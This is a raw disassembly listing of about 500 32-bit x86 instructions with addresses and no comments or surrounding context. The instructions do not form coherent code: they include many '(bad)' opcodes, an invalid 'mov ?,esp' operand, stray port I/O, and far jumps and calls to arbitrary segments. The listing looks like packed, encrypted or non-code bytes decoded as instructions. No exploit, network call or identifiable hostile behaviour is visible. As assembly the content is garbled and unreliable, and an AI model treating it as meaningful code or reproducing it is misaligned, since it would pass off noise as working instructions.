  434665:	xor    ch,BYTE PTR [edx+0xdc76ab7]
  43466b:	dec    edi
  43466c:	dec    esi
  43466d:	ja     0x434615
  43466f:	adc    eax,0x2c61d671
  434674:	mov    edi,0xc5bf50db
  434679:	psubusw mm1,QWORD PTR [ebx]
  43467c:	aas    
  43467d:	jg     0x434600
  43467f:	pusha  
  434680:	mov    WORD PTR [edi],fs
  434682:	mov    BYTE PTR [ecx-0x9e8b337],dh
  434688:	ss xchg edi,eax
  43468a:	pop    eax
  43468b:	mov    al,0xd3
  43468d:	call   0x177d7c26
  434692:	xchg   dl,ch
  434694:	sahf   
  434695:	cdq    
  434696:	xchg   ecx,eax
  434697:	lods   al,BYTE PTR ds:[esi]
  434698:	mov    ah,0x96
  43469a:	push   0x826bb922
  43469f:	(bad)  
  4346a0:	daa    
  4346a1:	mov    edx,0x4148a772
  4346a6:	and    al,0xe6
  4346a8:	and    edi,DWORD PTR [ebp-0x2]
  4346ab:	push   ebp
  4346ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4346ad:	scas   eax,DWORD PTR es:[edi]
  4346ae:	push   esi
  4346af:	imul   eax,ebx,0x98fdd8ab
  4346b5:	mov    al,ds:0xe68cb9bb
  4346ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4346bb:	call   0x95b5:0xb78197bf
  4346c2:	push   ecx
  4346c3:	pop    esp
  4346c4:	pop    ss
  4346c5:	bound  edx,QWORD PTR [ebp+edi*4-0x64a46660]
  4346cc:	daa    
  4346cd:	xchg   ecx,eax
  4346ce:	jne    0x43472c
  4346d0:	ins    DWORD PTR es:[edi],dx
  4346d1:	add    edi,0x21429487
  4346d7:	push   eax
  4346d8:	ss push eax
  4346da:	sub    al,0xd1
  4346dc:	mov    WORD PTR [ecx],ss
  4346de:	push   edi
  4346df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4346e0:	nop
  4346e1:	jl     0x434740
  4346e3:	in     al,0x42
  4346e5:	rol    BYTE PTR [edx-0x27],cl
  4346e8:	in     al,dx
  4346e9:	mov    ecx,0x374b8296
  4346ee:	cdq    
  4346ef:	jne    0x434768
  4346f1:	xor    al,0xb1
  4346f3:	xlat   BYTE PTR ds:[ebx]
  4346f4:	mov    ch,0xbf
  4346f6:	jecxz  0x43471e
  4346f8:	xchg   BYTE PTR [eax+0x2ad3c957],cl
  4346fe:	fisttp QWORD PTR [eax+0x3b]
  434701:	outs   dx,DWORD PTR ds:[esi]
  434702:	fwait
  434703:	icebp  
  434704:	call   0xea68efe3
  434709:	mov    esp,0xf78a91cc
  43470e:	sub    edi,edi
  434710:	dec    ebp
  434711:	retf   
  434712:	sahf   
  434713:	and    ebx,0x13
  434716:	lds    ebp,FWORD PTR [ebp-0x9]
  434719:	xchg   edx,eax
  43471a:	shl    DWORD PTR ds:0x8e67ba73,1
  434720:	pop    esi
  434721:	jmp    0xea04:0x770b31dd
  434728:	mov    ecx,0xcd7cfc17
  43472d:	mov    ds:0xeea1070a,al
  434732:	xor    dl,BYTE PTR [ecx]
  434734:	jnp    0x43476e
  434736:	fsubr  QWORD PTR [edx]
  434738:	adc    eax,0x23056f5f
  43473d:	pop    edi
  43473e:	cmp    ch,0x44
  434741:	inc    esi
  434742:	mov    cl,0x46
  434744:	cmc    
  434745:	jmp    0x434722
  434747:	inc    BYTE PTR [eax]
  434749:	mov    ds:0x759d57de,al
  43474e:	popa   
  43474f:	popa   
  434750:	mov    ah,0xf5
  434752:	ror    BYTE PTR ds:0xffde2dfd,cl
  434758:	loope  0x434793
  43475a:	pop    es
  43475b:	jno    0x4346e2
  43475d:	pop    esp
  43475e:	xchg   esi,eax
  43475f:	jae    0x43471a
  434761:	fisubr WORD PTR [ebx-0x3a]
  434764:	ja     0x43470e
  434766:	xor    ebx,DWORD PTR [ecx+0x4e]
  434769:	loop   0x434733
  43476b:	inc    ecx
  43476c:	push   es
  43476d:	mov    edi,0xf9c6ebd0
  434772:	xor    ebx,DWORD PTR [ecx]
  434774:	xor    al,0x6e
  434776:	mov    ds:0xdc87096e,al
  43477b:	xchg   ecx,eax
  43477c:	cld    
  43477d:	inc    ecx
  43477e:	adc    eax,0x81d0077d
  434783:	in     eax,0x32
  434785:	xchg   ecx,eax
  434786:	push   eax
  434787:	rcr    DWORD PTR [edx],0xda
  43478a:	adc    al,BYTE PTR [esi+0x27]
  43478d:	dec    esi
  43478e:	jle    0x434712
  434790:	retf   0x1a45
  434793:	jp     0x4347b6
  434795:	push   ecx
  434796:	mov    edi,0xd7a81782
  43479b:	test   DWORD PTR [ecx+ecx*4+0x5345cb78],ebx
  4347a2:	cmp    DWORD PTR [ebp-0x2aab01a4],0x67
  4347a9:	or     ebp,esp
  4347ab:	mov    bl,0x13
  4347ad:	out    0x2f,eax
  4347af:	inc    esi
  4347b0:	test   BYTE PTR [ebx+0x1d],dh
  4347b3:	jmp    0x434775
  4347b5:	in     eax,dx
  4347b6:	(bad)  
  4347b7:	out    0x79,al
  4347b9:	(bad)  
  4347bb:	jns    0x43480a
  4347bd:	jnp    0x43479c
  4347bf:	mov    eax,ds:0xd87c6430
  4347c4:	nop
  4347c5:	ins    DWORD PTR es:[edi],dx
  4347c6:	ret    
  4347c7:	mov    ?,esp
  4347c9:	bound  edx,QWORD PTR [esi-0x1f]
  4347cc:	lahf   
  4347cd:	sti    
  4347ce:	(bad)  
  4347cf:	push   ebx
  4347d0:	ret    
  4347d1:	push   edi
  4347d2:	(bad)  
  4347d3:	stc    
  4347d4:	int    0x68
  4347d6:	fisttp DWORD PTR [esp+ecx*1-0x4dcb3dfa]
  4347dd:	aas    
  4347de:	lea    edi,[esi-0x14]
  4347e1:	mov    bh,0x95
  4347e3:	popf   
  4347e4:	test   al,0xfa
  4347e6:	push   eax
  4347e7:	arpl   bx,si
  4347e9:	gs mov eax,0xe5623865
  4347ef:	(bad)  
  4347f1:	add    bh,BYTE PTR [esi+0x145080ad]
  4347f7:	dec    esp
  4347f8:	(bad)  
  4347f9:	imul   ebp,DWORD PTR [eax],0xffffffa9
  4347fc:	ins    BYTE PTR es:[edi],dx
  4347fd:	data16 sbb bh,BYTE PTR [ecx-0x6c]
  434801:	nop
  434802:	mov    ch,0xee
  434804:	pushf  
  434805:	and    ebp,DWORD PTR [ebx-0x5e6ace42]
  43480b:	scas   eax,DWORD PTR es:[edi]
  43480c:	addr16 pop bx
  43480f:	inc    edi
  434810:	mov    esp,0x6abd7a64
  434815:	dec    ebp
  434816:	jo     0x4347ce
  434818:	sub    bh,BYTE PTR [ebx]
  43481a:	pop    ebp
  43481b:	sub    esi,ebp
  43481d:	daa    
  43481e:	pop    esi
  43481f:	xchg   esi,eax
  434820:	ds inc edi
  434822:	sub    eax,0x60f8aae8
  434827:	mov    ecx,0x3ddc40fa
  43482c:	jmp    0x484f:0xa39b
  434832:	inc    ecx
  434833:	and    al,0xc4
  434835:	(bad)  
  434837:	pop    ss
  434838:	retf   
  434839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43483a:	push   0xd
  43483c:	jbe    0x434862
  43483e:	sub    esp,DWORD PTR [edx+0xc]
  434841:	stos   BYTE PTR es:[edi],al
  434842:	add    esp,ebx
  434844:	test   al,0x19
  434846:	xchg   esp,eax
  434847:	lahf   
  434848:	xchg   edx,eax
  434849:	cmp    BYTE PTR [eax],bl
  43484b:	leave  
  43484c:	data16 ins BYTE PTR es:[edi],dx
  43484e:	loope  0x4347fa
  434850:	sbb    BYTE PTR [esi+0x58cbfde9],bh
  434856:	mov    ds:0x4f957603,eax
  43485b:	add    al,0x5d
  43485d:	repz into 
  43485f:	or     DWORD PTR [edi-0x5f],ebx
  434862:	mov    dh,0x2e
  434864:	call   0x710c41eb
  434869:	out    0x95,eax
  43486b:	mov    edi,ebx
  43486d:	iret   
  43486e:	inc    eax
  43486f:	mov    al,ds:0x4c4fca81
  434875:	(bad)  
  434876:	cmc    
  434877:	jl     0x4348c9
  434879:	cmp    eax,0x12b98313
  43487e:	add    DWORD PTR [esi+0x4d],ebx
  434881:	fs es pop es
  434884:	ret    
  434885:	aad    0x91
  434887:	(bad)  
  434888:	out    0xb8,eax
  43488a:	int3   
  43488b:	jg     0x43484e
  43488d:	pusha  
  43488e:	pop    ds
  43488f:	and    eax,0x11c18a24
  434894:	jge    0x4348f0
  434896:	sub    dl,BYTE PTR [ebx+0x5fa42a88]
  43489c:	jno    0x4348f0
  43489e:	lock mov bl,0x6d
  4348a1:	sub    ecx,0x16
  4348a4:	or     al,0x3e
  4348a6:	mov    bl,ah
  4348a8:	jnp    0x43486a
  4348aa:	push   ss
  4348ab:	inc    esp
  4348ac:	lahf   
  4348ad:	adc    al,0xbf
  4348af:	loope  0x4348ad
  4348b1:	and    al,0xdc
  4348b3:	sti    
  4348b4:	inc    edi
  4348b5:	push   0x2a
  4348b7:	adc    BYTE PTR ds:0x1e54ba8e,ch
  4348bd:	lea    edx,[ebx-0x5f]
  4348c0:	ins    DWORD PTR es:[edi],dx
  4348c1:	repz dec ecx
  4348c3:	rcl    BYTE PTR [ecx],cl
  4348c5:	std    
  4348c6:	fisubr WORD PTR [ecx+0x1464f375]
  4348cc:	rcl    DWORD PTR [ebx+0x28],cl
  4348cf:	dec    eax
  4348d0:	lods   eax,DWORD PTR ds:[esi]
  4348d1:	jmp    0x3acda98d
  4348d6:	jne    0x434894
  4348d8:	cmp    al,0xa0
  4348da:	ret    0x2de7
  4348dd:	mov    ch,0x82
  4348df:	jl     0x434890
  4348e1:	or     dl,BYTE PTR [ecx-0x47815f10]
  4348e7:	push   esi
  4348e8:	dec    esp
  4348e9:	inc    esp
  4348ea:	mov    dh,0xb3
  4348ec:	mov    ebx,0xedbd89bb
  4348f1:	enter  0x551a,0xd0
  4348f5:	cld    
  4348f6:	int3   
  4348f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4348f8:	call   0x639f:0x4147327a
  4348ff:	ss pop esp
  434901:	mov    edi,0xece11b1c
  434906:	(bad)  
  434907:	jno    0x434889
  434909:	fsub   QWORD PTR [edx-0x44bec96e]
  43490f:	xor    ch,ah
  434911:	mov    bh,0xf1
  434913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434914:	aam    0x45
  434916:	mov    ah,0xb4
  434918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434919:	(bad)  
  43491b:	push   cs
  43491c:	out    dx,al
  43491d:	dec    ebx
  43491e:	inc    ecx
  43491f:	push   esi
  434920:	jecxz  0x4348b6
  434922:	ror    DWORD PTR [edi-0x4c326872],1
  434928:	das    
  434929:	jae    0x4348f9
  43492b:	and    DWORD PTR [ebx+0x20da74b3],0x3c84e8d
  434935:	push   edx
  434936:	sbb    BYTE PTR [edx-0x363547a],dl
  43493c:	jbe    0x4349b2
  43493e:	stos   DWORD PTR es:[edi],eax
  43493f:	jnp    0x4348fd
  434941:	dec    ebx
  434942:	mov    ch,0x8b
  434944:	xor    DWORD PTR [ebp-0x13de0019],edx
  43494a:	cmp    esp,eax
  43494c:	repnz push cs
  43494e:	mov    ecx,0xb3413f2
  434953:	adc    al,0xe
  434955:	fs scas eax,DWORD PTR es:[edi]
  434957:	push   es
  434958:	sti    
  434959:	lock int 0xce
  43495c:	outs   dx,DWORD PTR ds:[esi]
  43495d:	lods   eax,DWORD PTR ds:[esi]
  43495e:	xchg   ecx,eax
  43495f:	rol    DWORD PTR [esi-0x24],1
  434962:	hlt    
  434963:	pop    ecx
  434964:	adc    BYTE PTR [ebp-0x7ff39d61],ch
  43496a:	inc    esp
  43496b:	out    dx,al
  43496c:	mov    dh,0xbd
  43496e:	shl    DWORD PTR [ecx+0x6],0xf0
  434972:	ins    BYTE PTR es:[edi],dx
  434973:	daa    
  434974:	in     eax,0x3d
  434976:	mov    ds:0x85a5b561,al
  43497b:	daa    
  43497c:	aad    0xd8
  43497e:	leave  
  43497f:	mov    fs,WORD PTR [ebx]
  434981:	and    dh,BYTE PTR [edi+edx*2]
  434984:	inc    esp
  434985:	mov    ch,0x10
  434987:	cmc    
  434988:	jb     0x4349e8
  43498a:	int    0xe9
  43498c:	sbb    BYTE PTR [edx+ecx*8],ah
  43498f:	outs   dx,DWORD PTR ds:[esi]
  434990:	jle    0x4349a9
  434992:	inc    ebx
  434993:	push   edi
  434994:	adc    al,0x3f
  434996:	cs rep ins DWORD PTR es:[edi],dx
  434999:	mov    esi,0x4cde09
  43499e:	jnp    0x434a0c
  4349a0:	mov    edx,0x6f406d8f
  4349a5:	mov    al,0xb6
  4349a7:	ins    BYTE PTR es:[edi],dx
  4349a8:	and    al,0xdd
  4349aa:	jnp    0x434960
  4349ac:	jae    0x43497f
  4349ae:	xor    ebp,DWORD PTR [eax+0x44]
  4349b1:	sbb    DWORD PTR [esi],0x47
  4349b4:	cdq    
  4349b5:	xchg   esp,eax
  4349b6:	fistp  DWORD PTR [edi-0xe]
  4349b9:	pop    edx
  4349ba:	fild   QWORD PTR [ecx-0x496fb126]
  4349c0:	rol    BYTE PTR [edx],1
  4349c2:	ret    0x8c5f
  4349c5:	xchg   DWORD PTR [esi-0x22],edx
  4349c8:	jbe    0x434a3d
  4349ca:	pop    esp
  4349cb:	jl     0x4349e6
  4349cd:	in     eax,dx
  4349ce:	scas   eax,DWORD PTR es:[edi]
  4349cf:	dec    eax
  4349d0:	inc    edx
  4349d1:	fs loop 0x43495a
  4349d4:	sub    ecx,DWORD PTR [ebp+0x6b]
  4349d7:	or     eax,ebx
  4349d9:	jge    0x4349fc
  4349db:	xchg   esi,eax
  4349dc:	mov    eax,0x793a1e70
  4349e1:	lods   eax,DWORD PTR ds:[esi]
  4349e2:	stos   DWORD PTR es:[edi],eax
  4349e3:	xchg   BYTE PTR [ebp+0x4a],dh
  4349e6:	push   ebp
  4349e7:	xchg   esp,eax
  4349e8:	xchg   ecx,eax
  4349e9:	aam    0x17
  4349eb:	mov    edx,0x37547b25
  4349f0:	jl     0x434a48
  4349f2:	jmp    0x434a57
  4349f4:	xor    DWORD PTR ds:0x544c9aac,edi
  4349fa:	sbb    al,bh
  4349fc:	es popf 
  4349fe:	mov    al,ds:0x74883a46
  434a03:	in     al,dx
  434a04:	loope  0x434a79
  434a06:	xchg   esi,eax
  434a07:	lds    ebp,FWORD PTR [edx+ebp*8-0x60]
  434a0b:	pop    ebx
  434a0c:	jecxz  0x4349b4
  434a0e:	lods   al,BYTE PTR ds:[esi]
  434a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434a10:	rcl    DWORD PTR [esi-0x29c5651e],cl
  434a16:	inc    ebx
  434a17:	and    DWORD PTR [esi+0x59b094f1],ecx
  434a1d:	fidiv  DWORD PTR [ecx+edx*2-0x2e374876]
  434a24:	pop    ss
  434a25:	test   al,0x8c
  434a27:	mov    edx,DWORD PTR [edi+0x3d6c0bf2]
  434a2d:	int    0x1e
  434a2f:	out    dx,al
  434a30:	test   DWORD PTR [eax+edx*8+0x7f],0x88ca15f
  434a38:	fcom   QWORD PTR [edi-0x4a6301f2]
  434a3e:	adc    ecx,ecx
  434a40:	dec    ecx
  434a41:	dec    DWORD PTR [edi]
  434a43:	mov    ch,0x1a
  434a45:	int    0xdd
  434a47:	sbb    DWORD PTR [ebx+0x45],esi
  434a4a:	cmp    ebp,0xde4fd4be
  434a50:	mov    ebx,ebp
  434a52:	xchg   edi,eax
  434a53:	mov    ecx,0x91c90f56
  434a58:	in     al,dx
  434a59:	lods   al,BYTE PTR ds:[esi]
  434a5a:	push   0xdd66184b
  434a5f:	add    DWORD PTR [esi+0x753d632a],ebp
  434a65:	cli    
  434a66:	(bad)  
  434a67:	push   0x27
  434a69:	xor    ecx,esi
  434a6b:	and    edx,DWORD PTR ds:0xe265b48c
  434a71:	or     eax,0x2ca32c77
  434a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434a77:	mov    cl,BYTE PTR [ebx+0x6fd03358]
  434a7d:	xchg   ecx,eax
  434a7e:	xor    dh,BYTE PTR [ecx-0x1115e473]
  434a84:	mov    ebx,0x9969e48
  434a89:	dec    ebp
  434a8a:	jns    0x434a20
  434a8c:	push   0xf2ab939a
  434a91:	pop    edx
  434a92:	std    
  434a93:	sbb    edi,DWORD PTR [ebx+ebx*8-0x54]
  434a97:	xchg   ecx,esp
  434a99:	jmp    0xe7392aef
  434a9e:	pop    esi
  434a9f:	add    DWORD PTR [ecx-0xd],0x1c65957
  434aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434aa7:	call   0x8ee1c214
  434aac:	mov    eax,ds:0xd34d8b6f
  434ab1:	outs   dx,DWORD PTR ds:[esi]
  434ab2:	pop    ds
  434ab3:	jge    0x434af1
  434ab5:	mov    edi,0x76ae3039
  434aba:	xor    DWORD PTR [eax],ebx
  434abc:	leave  
  434abd:	mov    ah,0xe6
  434abf:	outs   dx,BYTE PTR ds:[esi]
  434ac0:	or     bh,ah
  434ac2:	push   esi
  434ac3:	cmp    bl,BYTE PTR [esi-0x506dff8a]
  434ac9:	pop    ecx
  434aca:	mov    ebx,DWORD PTR [edi+0x16]
  434acd:	repnz xor DWORD PTR [bp+di-0x4e],esi
  434ad2:	cmp    eax,0x544d1afe
  434ad7:	(bad)  [edx-0x4]
  434ada:	repz or eax,0x83d14957
  434ae0:	xchg   esi,eax
  434ae1:	cwde   
  434ae2:	loop   0x434a99
  434ae4:	xor    al,0xa7
  434ae6:	out    dx,al
  434ae7:	out    dx,eax
  434ae8:	or     DWORD PTR [ecx],edx
  434aea:	add    DWORD PTR [esi-0x7d],esi
  434aed:	ins    BYTE PTR es:[edi],dx
  434aee:	aad    0x69
  434af0:	mov    ds:0x693bbb53,eax
  434af5:	cmp    DWORD PTR [eax+0x5ef8a698],ebp
  434afb:	inc    DWORD PTR [edi]
  434afd:	sbb    eax,0xd148c9d2
  434b02:	mov    ah,0x62
  434b04:	push   edx
  434b05:	dec    ebx
  434b06:	xlat   BYTE PTR ds:[ebx]
  434b07:	rol    BYTE PTR [edi-0x74093dc4],1
  434b0d:	mov    ebp,0x6633b52a
  434b12:	leave  
  434b13:	fsubr  DWORD PTR ds:0xb573036d
  434b19:	test   BYTE PTR [ebp+0x37bd119b],ah
  434b1f:	popa   
  434b20:	sbb    eax,0x10a60167
  434b25:	loope  0x434ac7
  434b27:	div    BYTE PTR [ebx+eiz*4-0x61]
  434b2b:	jmp    0x434b5b
  434b2d:	scas   eax,DWORD PTR es:[edi]
  434b2e:	mov    ds:0xfcd971bd,al
  434b33:	cmp    DWORD PTR [eax+edi*4+0x4f],ebx
  434b37:	cmp    ebx,DWORD PTR [ecx]
  434b39:	and    al,0x9f
  434b3b:	pop    edx
  434b3c:	mov    al,ds:0xe143042a
  434b41:	cmp    al,bh
  434b43:	xchg   edx,eax
  434b44:	sub    dl,0x3
  434b47:	sar    DWORD PTR [eax-0x78],cl
  434b4a:	mov    cl,0x3d
  434b4c:	jl     0x434bc7
  434b4e:	jns    0x434bb8
  434b50:	les    ebx,FWORD PTR [edi-0x4b]
  434b53:	fidivr DWORD PTR [ebp+0x4bf8a664]
  434b59:	pop    es
  434b5a:	xor    al,0x92
  434b5c:	mov    edi,0x77c354cd
  434b61:	push   edi
  434b62:	mov    ah,0xfe
  434b64:	scas   eax,DWORD PTR es:[edi]
  434b65:	sub    BYTE PTR [eax],dl
  434b67:	popa   
  434b68:	aas    
  434b69:	mov    ah,0x42
  434b6b:	sbb    eax,0xff61f24d
  434b70:	jecxz  0x434bab
  434b72:	mov    es,edx
  434b74:	sbb    DWORD PTR [esi+0x6f6c63f3],edi
  434b7a:	aas    
  434b7b:	xchg   ecx,eax
  434b7c:	leave  
  434b7d:	fisttp DWORD PTR [edx]
  434b7f:	into   
  434b80:	ja     0x434b3a
  434b82:	cli    
  434b83:	and    cl,dh
  434b85:	popa   
  434b86:	test   DWORD PTR [eax-0x6b],edx
  434b89:	pop    ecx
  434b8a:	mov    ds:0x7d992507,eax
  434b8f:	xchg   esi,eax
  434b90:	add    eax,0xbb6d1fea
  434b95:	lods   al,BYTE PTR ds:[esi]
  434b96:	data16 (bad) 
  434b98:	out    0xb0,al
  434b9a:	mov    eax,ds:0xbd038aa
  434b9f:	adc    eax,0xa47d85c3
  434ba4:	pusha  
  434ba5:	jmp    0x580b338b
  434baa:	gs inc esp
  434bac:	mov    dl,0x29
  434bae:	or     bh,BYTE PTR [ecx+0x4e]
  434bb1:	mov    ch,0xaf
  434bb3:	dec    ecx
  434bb4:	(bad)  
  434bb5:	call   0xb201b5f3
  434bba:	inc    ebx
  434bbb:	repz in al,dx
  434bbd:	lods   al,BYTE PTR ds:[esi]
  434bbe:	loope  0x434bfa
  434bc0:	stos   BYTE PTR es:[edi],al
  434bc1:	je     0x434c30
  434bc3:	and    ch,BYTE PTR [edi-0x5c]
  434bc6:	pop    edi
  434bc7:	iret   
  434bc8:	idiv   DWORD PTR [edx+0x65]
  434bcb:	xchg   edx,eax
  434bcc:	scas   eax,DWORD PTR es:[edi]
  434bcd:	lahf   
  434bce:	test   eax,0xfd406d08
  434bd3:	fidivr DWORD PTR [ecx-0x607b6da4]
  434bd9:	inc    esi
  434bda:	popf   
  434bdb:	movntq QWORD PTR [edi-0x35b6afde],mm7
  434be2:	aad    0x8b
  434be4:	ss aaa 
  434be6:	sub    BYTE PTR [edi+0x20d3c62e],0x95
  434bed:	sub    esi,ebx
  434bef:	popf   
  434bf0:	dec    esi
  434bf1:	fistp  DWORD PTR [ecx]
  434bf3:	mov    al,cl
  434bf5:	dec    ebp
  434bf6:	mov    ebp,esp
  434bf8:	out    dx,al
  434bf9:	jg     0x434bed
  434bfb:	sar    DWORD PTR [ecx+0x2e],1
  434bfe:	xchg   esi,eax
  434bff:	and    dl,BYTE PTR [eax]
  434c01:	xchg   ebx,eax
  434c02:	and    BYTE PTR [edx-0x3e],0x8f
  434c06:	adc    eax,0x5bae96d7
  434c0b:	(bad)  
  434c0c:	in     eax,dx
  434c0d:	in     al,dx
  434c0e:	cmc    
  434c0f:	jns    0x434c21
  434c11:	adc    BYTE PTR [ebx-0x465aead4],bl
  434c17:	loope  0x434bb6
  434c19:	cli    
  434c1a:	mov    edx,0x1c7d0abd
  434c1f:	xor    ah,dh
  434c21:	cmp    BYTE PTR [ebx+0x52],0xfe
  434c25:	pop    ebx
  434c26:	dec    esi
  434c27:	cmc    
  434c28:	mov    ds:0x44506c34,eax
  434c2d:	rol    esp,1
  434c2f:	sbb    DWORD PTR [edx],esi
  434c31:	mov    ds:0x1bb04191,eax
  434c36:	xor    edi,ecx
  434c38:	stos   DWORD PTR es:[edi],eax
  434c39:	mov    ebp,0x44b9f751
  434c3e:	dec    ebx
  434c3f:	dec    eax
  434c40:	adc    BYTE PTR [eax+0x2f],dl
  434c43:	mov    esp,0xe8b97dc1
  434c48:	jns    0x434c6e
  434c4a:	mov    dl,0xc5
  434c4c:	mov    ebp,0xc6b3ba9a
  434c51:	add    al,0xb3
  434c53:	pusha  
  434c54:	inc    ebx
  434c55:	pop    esp
  434c56:	sub    al,BYTE PTR [ebx]
  434c58:	ror    edx,0xa4
  434c5b:	loope  0x434c52
  434c5d:	mov    ebp,0x90552832
  434c62:	aas    
  434c63:	aas    
  434c64:	cmp    al,0x26
  434c66:	jmp    0x434c0c
  434c68:	xlat   BYTE PTR ds:[ebx]
  434c69:	or     DWORD PTR [ebp-0x2eac8e7d],0x76
  434c70:	adc    al,0xf0
  434c72:	add    DWORD PTR [ebx],ebx
  434c74:	lock vmwrite edx,ebx
  434c78:	xlat   BYTE PTR ds:[ebx]
  434c79:	aaa    
  434c7a:	in     eax,0x40
  434c7c:	repz xor esi,ebx
  434c7f:	xchg   ecx,eax
  434c80:	mov    esi,0x7ab821a8
  434c85:	out    dx,al
  434c86:	mov    ebx,0x6159dc37
  434c8b:	(bad)  [ecx+edi*2]
  434c8e:	jns    0x434c46
  434c90:	jl     0x434cb8
  434c92:	pop    es
  434c93:	popf   
  434c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434c95:	xchg   esi,eax
  434c96:	xor    ch,BYTE PTR [ebx+0x46]
  434c99:	cmp    DWORD PTR [ebp-0x4d],0x1b011c88
  434ca0:	pusha  
  434ca1:	dec    esp
  434ca2:	inc    ebp
  434ca3:	nop
  434ca4:	in     eax,dx
  434ca5:	in     eax,0xa
  434ca7:	dec    ecx
  434ca8:	sub    esp,DWORD PTR [eax-0x27]
  434cab:	sbb    BYTE PTR [ecx-0x13],al
  434cae:	fcom   DWORD PTR [ecx]
  434cb0:	pusha  
  434cb1:	push   ss
  434cb2:	(bad)  
  434cb3:	sbb    BYTE PTR ds:0x9bc37812,cl
  434cb9:	mov    edx,0xf122cad3
  434cbe:	and    eax,0x97651f5c
  434cc3:	retf   0xf192
  434cc6:	add    eax,0x85606122
  434ccb:	fmul   QWORD PTR [ebx]
  434ccd:	sub    DWORD PTR [esi],edx
  434ccf:	jb     0x434d09
  434cd1:	sub    eax,0x95ffad9
  434cd6:	adc    ah,bh
  434cd8:	ret    
  434cd9:	repnz pusha 
  434cdb:	sahf   
  434cdc:	inc    eax
  434cdd:	(bad)  
  434cde:	mov    cl,0xc3
  434ce0:	or     eax,0xb2a0ea2c
  434ce5:	xor    cl,dl
  434ce7:	or     al,0xf
  434ce9:	sbb    cl,BYTE PTR [ecx+0x2c]
  434cec:	jne    0x434d5c
  434cee:	sahf   
  434cef:	cld    
  434cf0:	aaa    
  434cf1:	xchg   ebx,ebx
  434cf3:	out    0x68,al
  434cf5:	mov    eax,ds:0x9bb3ab2e
  434cfa:	pop    edx
  434cfb:	push   esp
  434cfc:	push   ss
  434cfd:	adc    eax,0x7b137864
  434d02:	mov    ds:0xd4a74b54,eax
  434d07:	sbb    al,0xd1
  434d09:	xchg   ebx,eax
  434d0a:	xchg   esp,eax
  434d0b:	pop    esp
  434d0c:	adc    al,0x4e
  434d0e:	enter  0xdb,0xcb
  434d12:	ficom  DWORD PTR [ebp-0x5d]
  434d15:	jnp    0x434ca2
  434d17:	out    0xa0,al
  434d19:	add    al,0x36
  434d1b:	sub    edi,ebp
  434d1d:	mov    esi,ebp
  434d1f:	pop    ebp
  434d20:	jmp    FWORD PTR [ebx+0x7a987326]
  434d26:	imul   edi,DWORD PTR [esi+edi*2-0x3162bb4b],0xffffffb0
  434d2e:	loopne 0x434d7d
  434d30:	dec    eax
  434d31:	sbb    ah,BYTE PTR ds:0xb21b2b77
  434d37:	jg     0x434da4
  434d39:	add    al,0xad
  434d3b:	sub    BYTE PTR [ecx+0x0],cl
  434d3e:	das    
  434d3f:	ror    DWORD PTR [edx+eiz*1],0x54
  434d43:	ins    BYTE PTR es:[edi],dx
  434d44:	(bad)  
  434d45:	jne    0x434d7e
  434d47:	pop    es
  434d48:	and    eax,0x80ffe119
  434d4d:	cld    
  434d4e:	adc    esi,ebx
  434d50:	lea    ecx,[ebp-0x1f]
  434d53:	adc    DWORD PTR [ebp+0x4af66c18],0xfffffff6
  434d5a:	xor    dh,BYTE PTR [ebx+0x3716bf98]
  434d60:	fiadd  DWORD PTR [ecx-0x78]
  434d63:	add    ecx,DWORD PTR [esi-0x413fddf8]
  434d69:	popa   
  434d6a:	push   ecx
  434d6b:	push   esp
  434d6c:	adc    ebp,DWORD PTR [edx+0x3e]
  434d6f:	pop    esi
  434d70:	xlat   BYTE PTR ds:[ebx]
  434d71:	inc    esp
  434d72:	test   BYTE PTR [edi+0x5c5e0450],al
  434d78:	add    BYTE PTR [edi],cl
  434d7a:	(bad)  
  434d7d:	stos   BYTE PTR es:[edi],al
  434d7e:	scas   eax,DWORD PTR es:[edi]
  434d7f:	mov    ds:0x84c318d2,al
  434d84:	xchg   ebx,eax
  434d85:	cmp    eax,0x7a1bd376
  434d8a:	lahf   
  434d8b:	mov    eax,ds:0x2b993f13
  434d90:	outs   dx,BYTE PTR ds:[esi]
  434d91:	sbb    al,0xf7
  434d93:	mov    eax,ds:0x2af56689
  434d98:	data16 invd 
  434d9b:	pop    esi
  434d9c:	enter  0x4c2c,0x14
  434da0:	loope  0x434e1d
  434da2:	scas   al,BYTE PTR es:[edi]
  434da3:	push   ss
  434da4:	repz aas 
  434da6:	repz mov eax,0xec6f3ad9
  434dac:	jno    0x434df4
  434dae:	adc    DWORD PTR [ebx],0xffffffb3
  434db1:	jmp    0x3769:0x8d7d0465
  434db8:	jbe    0x434d41
  434dba:	jnp    0x434d91
  434dbc:	ins    BYTE PTR es:[edi],dx
  434dbd:	or     eax,0xf5286f36
  434dc2:	mov    ebx,0xefeb70e1
  434dc7:	pop    eax
  434dc8:	in     al,dx
  434dc9:	inc    ecx
  434dca:	je     0x434d95
  434dcc:	push   edi
  434dcd:	in     al,0x9f
  434dcf:	dec    edx
  434dd0:	repnz push edx
  434dd2:	add    BYTE PTR cs:[ecx+eax*8],0xa8
  434dd7:	dec    cl
  434dd9:	std    
  434dda:	push   ecx
  434ddb:	popf   
  434ddc:	push   edx
  434ddd:	addr16 push 0x19
  434de0:	pop    edi
  434de1:	cmp    BYTE PTR [edx+edx*4+0x7c86eada],ah
  434de8:	imul   ebp,DWORD PTR ds:0x94fc4273,0x20
  434def:	cs xchg ebx,eax
  434df1:	data16 adc al,0x4d
  434df4:	jnp    0x434db8
  434df6:	xchg   esp,eax
  434df7:	mov    DWORD PTR [ebx+eax*1-0x66],ebx
  434dfb:	rcl    esp,0xc7
  434dfe:	jge    0x434e43
  434e00:	sbb    BYTE PTR [ecx+eax*8-0x58],dh
  434e04:	enter  0x30f5,0x71
  434e08:	mov    edi,eax
  434e0a:	mov    WORD PTR [ebx],fs
  434e0c:	ins    DWORD PTR es:[edi],dx
  434e0d:	pop    es
  434e0e:	out    dx,eax
